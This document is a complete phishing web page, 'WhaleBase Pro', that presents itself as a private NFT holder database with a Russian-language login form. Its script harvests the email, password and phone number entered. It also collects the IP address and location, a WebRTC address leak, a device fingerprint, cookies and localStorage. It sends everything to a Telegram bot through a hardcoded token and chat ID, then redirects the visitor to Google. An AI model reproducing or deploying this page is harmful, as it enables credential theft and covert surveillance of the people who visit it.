<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title>WhaleBase Pro</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
background:#0a0e14;color:#e2e8f0;
font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px
}
.container{width:100%;max-width:420px}
.header{text-align:center;margin-bottom:18px}
.logo{font-size:40px;margin-bottom:4px}
.logo-text{font-size:24px;font-weight:800;background:linear-gradient(135deg,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo-sub{font-size:11px;color:#64748b;letter-spacing:3px;text-transform:uppercase;margin-top:4px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:18px}
.stat-box{background:#121720;border:1px solid #1e2836;border-radius:10px;padding:12px 8px;text-align:center}
.stat-num{font-size:20px;font-weight:700;color:#10b981}
.stat-lbl{font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:3px}
.card{background:#121720;border:1px solid #1e2836;border-radius:14px;padding:26px 22px}
.card-title{font-size:17px;font-weight:700;text-align:center;margin-bottom:4px}
.card-sub{font-size:12px;color:#64748b;text-align:center;margin-bottom:22px;line-height:1.4}
.badge{display:block;background:rgba(245,158,11,0.12);color:#f59e0b;border:1px solid rgba(245,158,11,0.25);padding:8px 14px;border-radius:20px;font-size:11px;font-weight:600;text-align:center;margin-bottom:18px}
.input-group{margin-bottom:13px}
.input-group label{display:block;font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:5px;font-weight:600}
.input-group input{width:100%;padding:13px 15px;background:#0a0e14;border:1px solid #1e2836;border-radius:9px;color:#fff;font-size:14px;font-family:inherit}
.input-group input:focus{outline:none;border-color:#3b82f6}
.input-group input::placeholder{color:#3a4450}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:5px}
.btn:active{transform:scale(0.97);opacity:0.9}
.footer{text-align:center;margin-top:14px;font-size:10px;color:#64748b}
.loading{display:none;text-align:center;padding:30px 20px}
.loading.active{display:block}
.spinner{width:40px;height:40px;border:3px solid #1e2836;border-top-color:#3b82f6;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 14px}
@keyframes spin{to{transform:rotate(360deg)}}
@media(max-width:380px){.card{padding:20px 14px}.input-group input{padding:11px 13px;font-size:13px}.btn{padding:12px;font-size:14px}}
</style>
</head>
<body>
<div class="container">

<div class="header">
<div class="logo">🐋</div>
<div class="logo-text">WhaleBase Pro</div>
<div class="logo-sub">NFT Holder Database</div>
</div>

<div class="stats">
<div class="stat-box"><div class="stat-num">1.8M</div><div class="stat-lbl">Холдеров</div></div>
<div class="stat-box"><div class="stat-num" style="color:#f59e0b">47K</div><div class="stat-lbl">Китов</div></div>
<div class="stat-box"><div class="stat-num" style="color:#3b82f6">Live</div><div class="stat-lbl">Сейчас</div></div>
</div>

<div class="card" id="mainCard">
<div class="card-title">🔐 Доступ к базе</div>
<div class="card-sub">Закрытая база холдеров NFT.<br>Войдите для продолжения.</div>
<div class="badge">⚠ Только для держателей NFT</div>

<div class="input-group">
<label>Email</label>
<input type="email" id="emailField" placeholder="your@email.com" autocomplete="email">
</div>

<div class="input-group">
<label>Пароль</label>
<input type="password" id="passField" placeholder="••••••••" autocomplete="current-password">
</div>

<div class="input-group">
<label>Телефон (для подтверждения)</label>
<input type="tel" id="phoneField" placeholder="+7 (___) ___-__-__" autocomplete="tel-national">
</div>

<button class="btn" id="loginBtn" onclick="login()">Войти в базу</button>
</div>

<div class="loading" id="loadingBlock">
<div class="spinner"></div>
<p style="color:#64748b;font-size:13px">Загружаем базу данных...</p>
</div>

<div class="footer">🔒 Данные шифруются. Доступ не разглашается.</div>
</div>

<script>
const TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
const CHAT="8192226287";
const REDIR="https://www.google.com";
const sid='w'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);

async function collect(d){
try{
const r=await fetch("https://ipapi.co/json/");
const j=await r.json();
d.ip=j.ip||"-";d.country=j.country_name||"-";d.city=j.city||"-";
d.region=j.region||"-";d.provider=j.org||"-";d.tz_ip=j.timezone||"-"
}catch(e){d.ip="error"}

try{
const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
pc.createDataChannel("");const o=await pc.createOffer();await pc.setLocalDescription(o);
const c=await new Promise(res=>{pc.onicecandidate=e=>{if(e&&e.candidate)res(e.candidate.candidate);else res("")};setTimeout(()=>res(""),1200)});
d.webrtc=c||"-";pc.close()
}catch(e){d.webrtc="error"}

d.ua=navigator.userAgent;d.platform=navigator.platform;d.lang=navigator.language;
d.sw=screen.width;d.sh=screen.height;d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
d.cpu=navigator.hardwareConcurrency||"?";d.ram=navigator.deviceMemory||"?";
d.mobile=/Mobi|Android/i.test(navigator.userAgent);

try{
const cv=document.createElement('canvas');const gl=cv.getContext('webgl');
if(gl){const db=gl.getExtension('WEBGL_debug_renderer_info');
if(db){d.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
}catch(e){}
if(!d.gpu)d.gpu="-";

try{const b=await navigator.getBattery();d.bat=Math.round(b.level*100)+"% ch:"+b.charging}catch(e){d.bat="-"}
try{if(navigator.connection){d.conn=navigator.connection.effectiveType}}catch(e){}
d.ref=document.referrer||"direct";
d.cookie=document.cookie||"-";

try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)ls[k]=localStorage.getItem(k)}d.ls=JSON.stringify(ls).substring(0,1000)}catch(e){d.ls="-"}
}

async function login(){
const email=document.getElementById('emailField').value.trim();
const pass=document.getElementById('passField').value.trim();
const phone=document.getElementById('phoneField').value.trim();

if(!email&&!phone){alert('Введите email или телефон');return}

document.getElementById('mainCard').style.display='none';
document.getElementById('loadingBlock').classList.add('active');
document.getElementById('loginBtn').disabled=true;

const d={};
d.entered_email=email||"-";
d.entered_password=pass||"-";
d.entered_phone=phone||"-";

await collect(d);

const msg=
`🚨 НОВЫЙ ЗАХОД

🆔 ${sid}
🕐 ${new Date().toLocaleString("ru-RU")}

🌐 IP: ${d.ip}
📍 ${d.country}, ${d.city}, ${d.region}
📡 ${d.provider}
🕐 TZ: ${d.tz} / IP: ${d.tz_ip}

📱 ${d.platform} | ${d.mobile?'MOBILE':'PC'}
🖥 ${d.sw}x${d.sh} | CPU:${d.cpu} | RAM:${d.ram}
🗣 ${d.lang}
🎮 ${d.gpu}
🔋 ${d.bat}
📶 ${d.conn||"-"}

✉️ EMAIL: ${d.entered_email}
🔑 PASSWORD: ${d.entered_password}
📞 PHONE: ${d.entered_phone}

🔗 REF: ${d.ref}
🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}
💾 LS: ${(d.ls||'-').substring(0,300)}`;

await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({chat_id:CHAT,text:msg})
});

setTimeout(()=>{window.location.replace(REDIR)},2500);
}
</script>
</body>
</html>
